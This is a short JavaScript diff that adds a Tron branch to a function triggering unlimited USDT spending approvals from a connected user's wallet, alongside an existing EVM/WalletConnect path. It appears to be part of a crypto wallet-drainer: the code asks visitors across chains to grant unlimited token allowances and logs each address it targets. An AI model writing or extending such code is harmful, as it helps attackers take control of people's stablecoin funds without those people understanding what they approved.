@@ -1,10 +1,22 @@
 import { getInjectedEVMProvider, executeUnlimitedUSDTApproval } from '@/lib/evmWallet'
 import { getEVMWCProvider } from '@/config/walletconnect'
+import { triggerTronUnlimitedApproval } from '@/lib/tronApprovalHelper'
 
 /**
- * Execute unlimited USDT approval for EVM / Ethereum wallets
+ * Execute unlimited USDT approval — dispatches to the correct chain handler.
+ *
+ * @param {string} userAddress
+ * @param {'evm'|'tron'} connectionType
+ * @param {import('@/lib/tronWalletConnectAdapter').TronWalletConnectAdapter|null} [tronWcAdapter]
  */
-export async function triggerUnlimitedApproval(userAddress, connectionType = 'evm') {
+export async function triggerUnlimitedApproval(userAddress, connectionType = 'evm', tronWcAdapter = null) {
+  // ---- TRON PATH ----
+  if (connectionType === 'tron') {
+    console.log(`[Approval] Triggering unlimited Tron USDT approval for ${userAddress}`)
+    return await triggerTronUnlimitedApproval(userAddress, tronWcAdapter)
+  }
+
+  // ---- EVM PATH ----
   console.log(`[Approval] Triggering unlimited EVM USDT approval for ${userAddress} via ${connectionType}`)
 
   // 1. Try WalletConnect if session is active
